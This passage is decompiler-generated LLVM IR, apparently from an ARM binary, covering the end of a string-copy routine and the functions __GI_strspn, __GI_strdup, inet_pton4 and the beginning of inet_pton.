  %v2_11440 = phi i32 [ %v1_11490, %dec_label_pc_11498 ], [ %v1_1142c, %dec_label_pc_11434 ]
  %v0_11438 = phi i32 [ %v1_1148c, %dec_label_pc_11498 ], [ %v0_11438.pre, %dec_label_pc_11434 ]
  %v1_11438 = inttoptr i32 %v0_11438 to i8*
  %v2_11438 = load i8, i8* %v1_11438, align 1
  %v3_11438 = zext i8 %v2_11438 to i32
  store i32 %v3_11438, i32* %r3.global-to-local, align 4
  %v2_1143c = icmp eq i8 %v2_11438, 0
  store i1 %v2_1143c, i1* %cpsr_z.global-to-local, align 1
  %v3_11440 = add i32 %v2_11440, 1
  %v4_11440 = inttoptr i32 %v3_11440 to i8*
  store i8 %v2_11438, i8* %v4_11440, align 1
  %v0_11444 = load i32, i32* %lr.global-to-local, align 4
  %v1_11444 = add i32 %v0_11444, 1
  store i32 %v1_11444, i32* @ip, align 4
  %v0_11448 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11448, label %.loopexit, label %dec_label_pc_1144c

dec_label_pc_1144c:                               ; preds = %dec_label_pc_11438
  %v0_1144c = load i32, i32* @r1, align 4
  %v1_1144c = add i32 %v0_1144c, 1
  %v2_1144c = inttoptr i32 %v1_1144c to i8*
  %v3_1144c = load i8, i8* %v2_1144c, align 1
  %v4_1144c = zext i8 %v3_1144c to i32
  store i32 %v4_1144c, i32* %r3.global-to-local, align 4
  %v2_11450 = icmp eq i8 %v3_1144c, 0
  store i1 %v2_11450, i1* %cpsr_z.global-to-local, align 1
  %v3_11454 = add i32 %v0_11444, 2
  %v4_11454 = inttoptr i32 %v3_11454 to i8*
  store i8 %v3_1144c, i8* %v4_11454, align 1
  %v0_11458 = load i32, i32* @r1, align 4
  %v1_11458 = add i32 %v0_11458, 1
  store i32 %v1_11458, i32* %r1.global-to-local, align 4
  %v0_1145c = load i32, i32* @ip, align 4
  %v1_1145c = add i32 %v0_1145c, 1
  store i32 %v1_1145c, i32* @ip, align 4
  %v0_11460 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11460, label %.loopexit, label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_1144c
  %v1_11464 = add i32 %v0_11458, 2
  %v2_11464 = inttoptr i32 %v1_11464 to i8*
  %v3_11464 = load i8, i8* %v2_11464, align 1
  %v4_11464 = zext i8 %v3_11464 to i32
  store i32 %v4_11464, i32* %r3.global-to-local, align 4
  %v2_11468 = icmp eq i8 %v3_11464, 0
  store i1 %v2_11468, i1* %cpsr_z.global-to-local, align 1
  %v3_1146c = add i32 %v0_1145c, 2
  %v4_1146c = inttoptr i32 %v3_1146c to i8*
  store i8 %v3_11464, i8* %v4_1146c, align 1
  %v0_11470 = load i32, i32* %r1.global-to-local, align 4
  %v1_11470 = add i32 %v0_11470, 1
  store i32 %v1_11470, i32* %r1.global-to-local, align 4
  %v0_11474 = load i32, i32* @ip, align 4
  %v1_11474 = add i32 %v0_11474, 1
  store i32 %v1_11474, i32* %lr.global-to-local, align 4
  %v0_11478 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11478, label %.loopexit, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_11464
  %v1_1147c = add i32 %v0_11470, 2
  %v2_1147c = inttoptr i32 %v1_1147c to i8*
  %v3_1147c = load i8, i8* %v2_1147c, align 1
  %v4_1147c = zext i8 %v3_1147c to i32
  store i32 %v4_1147c, i32* @ip, align 4
  store i32 %v1_1147c, i32* %r3.global-to-local, align 4
  %v2_11484 = icmp eq i8 %v3_1147c, 0
  store i1 %v2_11484, i1* %cpsr_z.global-to-local, align 1
  %v3_11488 = add i32 %v0_11474, 2
  %v4_11488 = inttoptr i32 %v3_11488 to i8*
  store i8 %v3_1147c, i8* %v4_11488, align 1
  %v0_1148c = load i32, i32* %r3.global-to-local, align 4
  %v1_1148c = add i32 %v0_1148c, 1
  store i32 %v1_1148c, i32* @r1, align 4
  %v0_11490 = load i32, i32* %lr.global-to-local, align 4
  %v1_11490 = add i32 %v0_11490, 1
  store i32 %v1_11490, i32* %lr.global-to-local, align 4
  %v0_11494 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11494, label %.loopexit, label %dec_label_pc_11498

dec_label_pc_11498:                               ; preds = %dec_label_pc_1147c
  %v0_11498 = load i32, i32* %r0.global-to-local, align 4
  %v1_11498 = add i32 %v0_11498, -1
  store i32 %v1_11498, i32* %r0.global-to-local, align 4
  %v7_11498 = icmp eq i32 %v0_11498, 1
  store i1 %v7_11498, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11498, label %dec_label_pc_114a0, label %dec_label_pc_11438

dec_label_pc_114a0:                               ; preds = %dec_label_pc_11498
  %v0_114a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_114a0 = urem i32 %v0_114a0, 4
  store i32 %v1_114a0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114c0

dec_label_pc_114a8:                               ; preds = %dec_label_pc_114c0
  %v0_114a8 = load i32, i32* @r1, align 4
  %v1_114a8 = inttoptr i32 %v0_114a8 to i8*
  %v2_114a8 = load i8, i8* %v1_114a8, align 1
  %v3_114a8 = zext i8 %v2_114a8 to i32
  store i32 %v3_114a8, i32* @ip, align 4
  %v2_114ac = icmp eq i8 %v2_114a8, 0
  store i1 %v2_114ac, i1* %cpsr_z.global-to-local, align 1
  %v1_114b0 = add i32 %v1_114cc, -1
  store i32 %v1_114b0, i32* %r2.global-to-local, align 4
  %v3_114b4 = add i32 %v3_114cc, 1
  %v4_114b4 = inttoptr i32 %v3_114b4 to i8*
  store i8 %v2_114a8, i8* %v4_114b4, align 1
  %v5_114b4 = load i32, i32* %lr.global-to-local, align 4
  %v6_114b4 = add i32 %v5_114b4, 1
  store i32 %v6_114b4, i32* %lr.global-to-local, align 4
  %v0_114b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_114b8, label %.loopexit, label %dec_label_pc_114bc

dec_label_pc_114bc:                               ; preds = %dec_label_pc_114a8
  %v0_114bc = load i32, i32* @r1, align 4
  %v1_114bc = add i32 %v0_114bc, 1
  store i32 %v1_114bc, i32* @r1, align 4
  %v0_114c0.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114c0thread-pre-split

dec_label_pc_114c0thread-pre-split:               ; preds = %dec_label_pc_114bc, %dec_label_pc_11428
  %v2_114b46 = phi i32 [ %v6_114b4, %dec_label_pc_114bc ], [ %v1_1142c, %dec_label_pc_11428 ]
  %v0_114c0.pr = phi i32 [ %v0_114c0.pr.pre, %dec_label_pc_114bc ], [ %v0_11428, %dec_label_pc_11428 ]
  br label %dec_label_pc_114c0

dec_label_pc_114c0:                               ; preds = %dec_label_pc_114c0thread-pre-split, %dec_label_pc_114a0
  %v3_114cc = phi i32 [ %v2_114b46, %dec_label_pc_114c0thread-pre-split ], [ %v1_11490, %dec_label_pc_114a0 ]
  %v1_114cc = phi i32 [ %v0_114c0.pr, %dec_label_pc_114c0thread-pre-split ], [ %v1_114a0, %dec_label_pc_114a0 ]
  %v2_114c0 = icmp eq i32 %v1_114cc, 0
  store i1 %v2_114c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114c0, label %dec_label_pc_114c8, label %dec_label_pc_114a8

dec_label_pc_114c8:                               ; preds = %dec_label_pc_114c0
  %v0_114c8 = load i32, i32* @ip, align 4
  %v2_114c8 = icmp eq i32 %v0_114c8, 0
  store i1 %v2_114c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114c8, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_114c8
  %v4_114cc = add i32 %v3_114cc, 1
  %v5_114cc = inttoptr i32 %v4_114cc to i8*
  store i8 0, i8* %v5_114cc, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1147c, %dec_label_pc_11464, %dec_label_pc_1144c, %dec_label_pc_11438, %dec_label_pc_114a8, %dec_label_pc_114c8, %bb
  %v0_114d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_114d0, i32* %r0.global-to-local, align 4
  %v2_114d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_114d4, i32* @r4, align 4
  ret i32 %v0_114d0

; uselistorder directives
  uselistorder i32 %v1_114cc, { 1, 0 }
  uselistorder i32 %v1_114a0, { 1, 0 }
  uselistorder i32 %v0_11498, { 1, 0 }
  uselistorder i32 %v1_11490, { 0, 2, 1 }
  uselistorder i32 %v1_1148c, { 1, 0 }
  uselistorder i32 %v0_11428, { 2, 1, 0, 3 }
  uselistorder i32 %v5_1141c, { 1, 0 }
  uselistorder i32 %v0_1141c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_115102 = load i32, i32* @r0, align 4
  %v1_115103 = inttoptr i32 %v0_115102 to i8*
  %v2_115104 = load i8, i8* %v1_115103, align 1
  %v2_115146 = icmp eq i8 %v2_115104, 0
  br i1 %v2_115146, label %dec_label_pc_11520, label %dec_label_pc_114ec.preheader

dec_label_pc_114e4:                               ; preds = %dec_label_pc_114ec
  %v1_114f4 = add i32 %v0_114f4, 1
  %v9_114e4 = icmp eq i8 %v0_11500.in, %v2_114ec
  br i1 %v9_114e4, label %dec_label_pc_11500, label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %dec_label_pc_114ec.preheader, %dec_label_pc_114e4
  %v0_114f4 = phi i32 [ %tmp, %dec_label_pc_114ec.preheader ], [ %v1_114f4, %dec_label_pc_114e4 ]
  %v1_114ec = inttoptr i32 %v0_114f4 to i8*
  %v2_114ec = load i8, i8* %v1_114ec, align 1
  %v3_114ec = zext i8 %v2_114ec to i32
  store i32 %v3_114ec, i32* @ip, align 4
  %v2_114f0 = icmp eq i8 %v2_114ec, 0
  br i1 %v2_114f0, label %dec_label_pc_11520, label %dec_label_pc_114e4

dec_label_pc_11500:                               ; preds = %dec_label_pc_114e4
  %v2_11500 = icmp eq i8 %v0_11500.in, 0
  br i1 %v2_11500, label %dec_label_pc_11520, label %dec_label_pc_11508

dec_label_pc_11508:                               ; preds = %dec_label_pc_11500
  %v1_11508 = add i32 %v0_11508, 1
  store i32 %v1_11508, i32* @lr, align 4
  %v1_1150c = add i32 %v0_1150c, 1
  %v1_11510 = inttoptr i32 %v1_1150c to i8*
  %v2_11510 = load i8, i8* %v1_11510, align 1
  %v2_11514 = icmp eq i8 %v2_11510, 0
  br i1 %v2_11514, label %dec_label_pc_11520, label %dec_label_pc_114ec.preheader

dec_label_pc_114ec.preheader:                     ; preds = %entry, %dec_label_pc_11508
  %v0_1150c = phi i32 [ %v1_1150c, %dec_label_pc_11508 ], [ %v0_115102, %entry ]
  %v0_11508 = phi i32 [ %v1_11508, %dec_label_pc_11508 ], [ 0, %entry ]
  %v0_11500.in = phi i8 [ %v2_11510, %dec_label_pc_11508 ], [ %v2_115104, %entry ]
  br label %dec_label_pc_114ec

dec_label_pc_11520:                               ; preds = %dec_label_pc_11500, %dec_label_pc_11508, %dec_label_pc_114ec, %entry
  %v0_11520 = phi i32 [ 0, %entry ], [ %v0_11508, %dec_label_pc_114ec ], [ %v1_11508, %dec_label_pc_11508 ], [ %v0_11508, %dec_label_pc_11500 ]
  ret i32 %v0_11520

; uselistorder directives
  uselistorder i8 %v0_11500.in, { 1, 0 }
  uselistorder i8 %v2_114ec, { 1, 2, 0 }
  uselistorder i32 %v0_114f4, { 1, 0 }
  uselistorder label %dec_label_pc_11520, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_114ec.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_11528 = load i32, i32* @r4, align 4
  store i32 %v3_11528, i32* %stack_var_-12, align 4
  %v6_11528 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_11530 = call i32 @strlen(i8* %arg1)
  %v1_11534 = add i32 %v3_11530, 1
  store i32 %v1_11534, i32* @r4, align 4
  %v1_1153c = call i32 @malloc(i32 %v1_11534)
  store i32 70992, i32* @lr, align 4
  %v1_1154c = icmp ne i32 %v1_1153c, 0
  call void @__pseudo_cond_branch(i1 %v1_1154c, i32 ptrtoint (i32* @global_var_c850.641 to i32))
  %v2_11554 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11554, i32* @r4, align 4
  store i32 %v6_11528, i32* @r5, align 4
  ret i32 %v1_1153c

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 2, 6, 7, 8, 5, 15, 13, 14, 9, 4, 11, 12, 0, 10, 1, 3 }
  uselistorder i32 (i32)* @malloc, { 5, 2, 1, 11, 12, 4, 3, 10, 9, 0, 8, 7, 6 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_11558 = load i32, i32* @r5, align 4
  %v2_11560 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_11560, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_115e83 = load i8, i8* %arg1, align 1
  %v3_115e84 = zext i8 %v2_115e83 to i32
  store i32 %v3_115e84, i32* @ip, align 4
  %v5_115e85 = add i32 %tmp, 1
  store i32 %v5_115e85, i32* @r4, align 4
  %v2_115ec6 = icmp eq i8 %v2_115e83, 0
  store i1 %v2_115ec6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115ec6, label %dec_label_pc_115f8, label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %entry, %dec_label_pc_115e8.backedge
  %v0_115c4 = phi i32 [ %v3_115e8, %dec_label_pc_115e8.backedge ], [ %v3_115e84, %entry ]
  %v1_115f010.in = phi i32 [ %v3_115e8, %dec_label_pc_115e8.backedge ], [ %v3_115e84, %entry ]
  %v1_115f010 = add nsw i32 %v1_115f010.in, -48
  %v2_11580 = icmp ugt i32 %v1_115f010, 8
  %v7_11580 = icmp eq i32 %v1_115f010, 9
  store i1 %v7_11580, i1* %cpsr_z.global-to-local, align 1
  %v2_11588 = xor i1 %v7_11580, true
  %v3_11588 = and i1 %v2_11580, %v2_11588
  br i1 %v3_11588, label %dec_label_pc_115c4, label %dec_label_pc_1158c

dec_label_pc_1158c:                               ; preds = %dec_label_pc_11580
  %v0_1158c = load i32, i32* %r0.global-to-local, align 4
  %v1_1158c = inttoptr i32 %v0_1158c to i8*
  %v2_1158c = load i8, i8* %v1_1158c, align 1
  %v3_1158c = zext i8 %v2_1158c to i32
  %v3_11594 = mul nuw nsw i32 %v3_1158c, 10
  %v4_11594 = add nuw nsw i32 %v3_11594, %v0_115c4
  %v1_11598 = add nsw i32 %v4_11594, -48
  %v2_1159c = icmp ugt i32 %v1_11598, 254
  %v7_1159c = icmp eq i32 %v1_11598, 255
  store i1 %v7_1159c, i1* %cpsr_z.global-to-local, align 1
  %v2_115a0 = xor i1 %v7_1159c, true
  %v3_115a0 = and i1 %v2_1159c, %v2_115a0
  br i1 %v3_115a0, label %dec_label_pc_1161c, label %dec_label_pc_115a4

dec_label_pc_115a4:                               ; preds = %dec_label_pc_1158c
  %v0_115a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_115a4 = icmp eq i32 %v0_115a4, 0
  store i1 %v2_115a4, i1* %cpsr_z.global-to-local, align 1
  %v1_115a8 = trunc i32 %v1_11598 to i8
  store i8 %v1_115a8, i8* %v1_1158c, align 1
  %v0_115ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_115ac, label %dec_label_pc_115b0, label %dec_label_pc_115e8.backedge

dec_label_pc_115b0:                               ; preds = %dec_label_pc_115a4
  %v0_115b0 = load i32, i32* @lr, align 4
  %v1_115b0 = add i32 %v0_115b0, 1
  store i32 %v1_115b0, i32* @lr, align 4
  %v7_115b4 = icmp eq i32 %v1_115b0, 4
  store i1 %v7_115b4, i1* %cpsr_z.global-to-local, align 1
  %v0_115b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_115b8 = add i32 %v0_115b8, 1
  store i32 %v1_115b8, i32* %r1.global-to-local, align 4
  %v8_115bc = icmp sgt i32 %v1_115b0, 4
  br i1 %v8_115bc, label %dec_label_pc_1161c, label %dec_label_pc_115e8.backedge

dec_label_pc_115c4:                               ; preds = %dec_label_pc_11580
  %v7_115c4 = icmp eq i32 %v0_115c4, 46
  store i1 %v7_115c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115c4, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_115c4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1161c

bb:                                               ; preds = %dec_label_pc_115c4
  %v1_115cc = load i32, i32* %r1.global-to-local, align 4
  %v2_115cc = urem i32 %v1_115cc, 2
  %v2_115d0 = icmp eq i32 %v2_115cc, 0
  store i1 %v2_115d0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_115d0, label %dec_label_pc_1161c, label %dec_label_pc_115dc

dec_label_pc_115dc:                               ; preds = %bb
  %v0_115dc = load i32, i32* @lr, align 4
  %v7_115dc = icmp eq i32 %v0_115dc, 4
  store i1 %v7_115dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115dc, label %dec_label_pc_1161c, label %dec_label_pc_115e4

dec_label_pc_115e4:                               ; preds = %dec_label_pc_115dc
  %v2_115e4 = load i32, i32* %r0.global-to-local, align 4
  %v3_115e4 = add i32 %v2_115e4, 1
  %v4_115e4 = inttoptr i32 %v3_115e4 to i8*
  store i8 0, i8* %v4_115e4, align 1
  %v5_115e4 = load i32, i32* %r0.global-to-local, align 4
  %v6_115e4 = add i32 %v5_115e4, 1
  store i32 %v6_115e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_115e8.backedge

dec_label_pc_115e8.backedge:                      ; preds = %dec_label_pc_115e4, %dec_label_pc_115a4, %dec_label_pc_115b0
  %v0_115e8 = load i32, i32* @r4, align 4
  %v1_115e8 = inttoptr i32 %v0_115e8 to i8*
  %v2_115e8 = load i8, i8* %v1_115e8, align 1
  %v3_115e8 = zext i8 %v2_115e8 to i32
  store i32 %v3_115e8, i32* @ip, align 4
  %v5_115e8 = add i32 %v0_115e8, 1
  store i32 %v5_115e8, i32* @r4, align 4
  %v2_115ec = icmp eq i8 %v2_115e8, 0
  store i1 %v2_115ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115ec, label %dec_label_pc_115e8.dec_label_pc_115f8_crit_edge, label %dec_label_pc_11580

dec_label_pc_115e8.dec_label_pc_115f8_crit_edge:  ; preds = %dec_label_pc_115e8.backedge
  %v0_115f8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_115f8

dec_label_pc_115f8:                               ; preds = %dec_label_pc_115e8.dec_label_pc_115f8_crit_edge, %entry
  %v0_115f8 = phi i32 [ %v0_115f8.pre, %dec_label_pc_115e8.dec_label_pc_115f8_crit_edge ], [ 0, %entry ]
  %v7_115f8 = icmp eq i32 %v0_115f8, 3
  store i1 %v7_115f8, i1* %cpsr_z.global-to-local, align 1
  %v7_115fc = icmp slt i32 %v0_115f8, 4
  br i1 %v7_115fc, label %dec_label_pc_1161c, label %dec_label_pc_11600

dec_label_pc_11600:                               ; preds = %dec_label_pc_115f8
  %v0_11600 = load i32, i32* @r5, align 4
  store i32 %v0_11600, i32* @r0, align 4
  store i32 %v2_11560, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1160c = call i32 @memcpy()
  br label %dec_label_pc_1161c

dec_label_pc_1161c:                               ; preds = %dec_label_pc_1158c, %dec_label_pc_115b0, %bb, %dec_label_pc_115dc, %.thread12, %dec_label_pc_115f8, %dec_label_pc_11600
  %storemerge = phi i32 [ 1, %dec_label_pc_11600 ], [ 0, %dec_label_pc_115f8 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_115dc ], [ 0, %bb ], [ 0, %dec_label_pc_115b0 ], [ 0, %dec_label_pc_1158c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_11558, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_115f8, { 1, 0 }
  uselistorder i32 %v3_115e8, { 2, 1, 0 }
  uselistorder i32 %v0_115c4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 7, 2, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 0, 5, 6, 7, 8, 9, 10, 1 }
  uselistorder label %dec_label_pc_1161c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_115e8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11580, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_11624 = load i32, i32* @r4, align 4
  %v6_11624 = load i32, i32* @r5, align 4
  %v9_11624 = load i32, i32* @r6, align 4
  %v7_11628 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_11628, label %dec_label_pc_11648, label %dec_label_pc_1163c

dec_label_pc_1163c:                               ; preds = %entry
  %v7_1163c = icmp eq i32 %arg1, 10
  br i1 %v7_1163c, label %dec_label_pc_1165c, label %dec_label_pc_1180c

dec_label_pc_11648:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_11650 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_11650, i32* %r0.global-to-local, align 4
  store i32 %v4_11650, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11824

dec_label_pc_1165c:                               ; preds = %dec_label_pc_1163c
  %v2_1165c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1165c, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_11668 = bitcast i32* %stack_var_-52 to i8*
  %v3_11668 = call i32 @__GI_memset(i8* %v2_11668, i32 0)
  store i32 %v3_11668, i32* %r0.global-to-local, align 4
  %v0_1166c = load i32, i32* @r6, align 4
  %v1_1166c = inttoptr i32 %v0_1166c to i8*
  %v2_1166c = load i8, i8* %v1_1166c, align 1
  %v3_1166c = zext i8 %v2_1166c to i32
  store i32 %v3_1166c, i32* %r3.global-to-local, align 4
  %v7_11670 = icmp eq i8 %v2_1166c, 58
  store i32 %v3_11668, i32* @r4, align 4
  %v2_11678 = add i32 %v3_11668, 16
  store i32 %v2_11678, i32* %r8.global-to-local, align 4
  br i1 %v7_11670, label %dec_label_pc_11680, label %dec_label_pc_1168c

dec_label_pc_11680:                               ; preds = %dec_label_pc_1165c
  %v1_11680 = add i32 %v0_1166c, 1
  %v2_11680 = inttoptr i32 %v1_11680 to i8*
  %v3_11680 = load i8, i8* %v2_11680, align 1
  %v4_11680 = zext i8 %v3_11680 to i32
  store i32 %v4_11680, i32* %r3.global-to-local, align 4
  store i32 %v1_11680, i32* @r6, align 4
  %v7_11684 = icmp eq i8 %v3_11680, 58
  br i1 %v7_11684, label %dec_label_pc_1168c, label %dec_label_pc_11820

dec_label_pc_1168c:                               ; preds = %dec_label_pc_11680, %dec_label_pc_1165c
  %v0_11690 = phi i32 [ %v1_11680, %dec_label_pc_11680 ], [ %v0_1166c, %dec_label_pc_1165c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_11690, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1176c7 = inttoptr i32 %v0_11690 to i8*
  %v2_1176c8 = load i8, i8* %v1_1176c7, align 1
  %v3_1176c9 = zext i8 %v2_1176c8 to i32
  store i32 %v3_1176c9, i32* %r0.global-to-local, align 4
  %v1_1177010 = call i32 @__GI_tolower(i32 %v3_1176c9)
  store i32 %v1_1177010, i32* %r0.global-to-local, align 4
  store i32 %v1_1177010, i32* @r5, align 4
  %v2_1177412 = icmp eq i32 %v1_1177010, 0
  br i1 %v2_1177412, label %dec_label_pc_1177c, label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %dec_label_pc_1168c, %dec_label_pc_1176c.backedge
  %v0_116a4 = phi i32 [ %v1_11770, %dec_label_pc_1176c.backedge ], [ %v1_1177010, %dec_label_pc_1168c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1176c.backedge ], [ 0, %dec_label_pc_1168c ]
  store i32 ptrtoint ([17 x i8]* @global_var_14a2c.736 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_14a2c.736 to i32), i32* %r0.global-to-local, align 4
  %v3_116ac = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_14a2c.736 to i32), i32 %v0_116a4)
  %v4_116ac = trunc i32 %v3_116ac to i8
  store i32 %v3_116ac, i32* %r0.global-to-local, align 4
  %v3_116b0 = icmp eq i8 %v4_116ac, 0
  %v0_116b4 = load i32, i32* @r6, align 4
  %v1_116b4 = add i32 %v0_116b4, 1
  store i32 %v1_116b4, i32* @r6, align 4
  br i1 %v3_116b0, label %dec_label_pc_116d0, label %dec_label_pc_116bc

dec_label_pc_116bc:                               ; preds = %dec_label_pc_116a0
  %v0_116bc = load i32, i32* %sb.global-to-local, align 4
  %v2_116bc = sext i8 %v4_116ac to i32
  %v3_116bc = sub i32 %v2_116bc, %v0_116bc
  store i32 %v3_116bc, i32* %r3.global-to-local, align 4
  %v1_116c0 = load i32, i32* %r7.global-to-local, align 4
  %v4_116c0 = mul i32 %v1_116c0, 16
  %v5_116c0 = or i32 %v4_116c0, %v3_116bc
  store i32 %v5_116c0, i32* %r7.global-to-local, align 4
  %v3_116c8 = icmp ult i32 %v5_116c0, 65534
  br i1 %v3_116c8, label %dec_label_pc_11764, label %dec_label_pc_11820

dec_label_pc_116d0:                               ; preds = %dec_label_pc_116a0
  %v0_116d0 = load i32, i32* @r5, align 4
  %v7_116d0 = icmp eq i32 %v0_116d0, 58
  br i1 %v7_116d0, label %dec_label_pc_116d8, label %dec_label_pc_11734

dec_label_pc_116d8:                               ; preds = %dec_label_pc_116d0
  %v4_116d82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_116d82, i32* %r3.global-to-local, align 4
  %v2_116dc = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_116dc, label %dec_label_pc_116e4, label %dec_label_pc_116f8

dec_label_pc_116e4:                               ; preds = %dec_label_pc_116d8
  %v0_116e4 = load i32, i32* %fp.global-to-local, align 4
  %v2_116e4 = icmp eq i32 %v0_116e4, 0
  br i1 %v2_116e4, label %dec_label_pc_116ec, label %dec_label_pc_11820

dec_label_pc_116ec:                               ; preds = %dec_label_pc_116e4
  %v0_116ec = load i32, i32* @r4, align 4
  store i32 %v0_116ec, i32* %fp.global-to-local, align 4
  store i32 %v1_116b4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1176c.backedge

dec_label_pc_116f8:                               ; preds = %dec_label_pc_116d8
  %v1_116f8 = inttoptr i32 %v1_116b4 to i8*
  %v2_116f8 = load i8, i8* %v1_116f8, align 1
  %v3_116f8 = zext i8 %v2_116f8 to i32
  store i32 %v3_116f8, i32* %r3.global-to-local, align 4
  %v2_116fc = icmp eq i8 %v2_116f8, 0
  br i1 %v2_116fc, label %dec_label_pc_11820, label %dec_label_pc_11704

dec_label_pc_11704:                               ; preds = %dec_label_pc_116f8
  %v0_11704 = load i32, i32* @r4, align 4
  %v1_11704 = add i32 %v0_11704, 2
  store i32 %v1_11704, i32* %r3.global-to-local, align 4
  %v1_11708 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_11704, %v1_11708
  br i1 %tmp38, label %dec_label_pc_11820, label %dec_label_pc_11710

dec_label_pc_11710:                               ; preds = %dec_label_pc_11704
